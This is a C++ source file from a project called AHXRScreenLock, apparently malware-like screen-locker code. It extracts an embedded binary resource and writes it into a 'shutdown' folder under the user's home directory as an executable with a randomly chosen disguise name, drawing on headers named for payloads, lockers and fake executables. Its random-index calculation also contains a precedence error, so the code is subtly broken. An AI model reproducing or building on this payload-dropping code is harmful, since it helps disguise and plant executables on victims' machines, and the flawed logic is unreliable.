/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include						"stdafx.h"

#ifdef __cplusplus_cli
#define generic __identifier(generic)
#endif
#include						<boost/filesystem.hpp>
#ifdef __cplusplus_cli
#undef generic
#endif

#include						"payload_shutdown.h"
#include						"directory.h"
#include						"resource1.h"
#include						"settings.h"
#include						"pack.h"
#include						"locker.h"
#include						"fake_exe.h"
#include						<Windows.h>
#include						<string>
#include						<fstream>
#include						<time.h>

using namespace					std;
HANDLE							h_fake;
DWORD							hd_fake;
DWORD WINAPI					t_buildFake(LPVOID lpParameter);

string getFullShutdownDirectory() {
	string s_directory(getHomeDirectory());
	s_directory += "\\" + string(SHUTDOWN_FOLDER_NAME);
	return s_directory;
}

inline bool createShutdownFolder() {
	return (CreateDirectoryA(getFullShutdownDirectory().c_str(), NULL) || ERROR_ALREADY_EXISTS == GetLastError());
}

DWORD WINAPI t_buildFake(LPVOID lpParameter) {
	fstream 
		f_build
	;
	string s_full_shutdown;

	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int i_resource = ::SizeofResource(NULL, hRes);
	LPVOID lpRes = LoadResource(NULL, hRes);
	void * pResourceLock = LockResource(lpRes);

	TCHAR tmpPath[MAX_PATH];
	GetTempPath(MAX_PATH, tmpPath);

	std::string s_extract;
	s_extract = tmpPath;
	s_extract += "protect.tmp";

	/*
	for ( char * x : c_fake_executables) {
		s_full_shutdown = getFullShutdownDirectory();
		s_full_shutdown += string("\\") + string(x) + string(".exe");
		f_build.open(s_full_shutdown, ios::out | ios::binary );
		f_build.write((char*)pResourceLock, i_resource);
		f_build.close();
	}*/

	srand(time(NULL));
	int i_rand_idx = rand() % sizeof(c_fake_executables) / sizeof(c_fake_executables[0]);
	s_full_shutdown = getFullShutdownDirectory();
	s_full_shutdown += string("\\") + string(c_fake_executables[i_rand_idx]) + string(".exe");
	f_build.open(s_full_shutdown, ios::out | ios::binary);
	f_build.write((char*)pResourceLock, i_resource);
	f_build.close();

	std::remove(s_extract.c_str());
	return 0;
}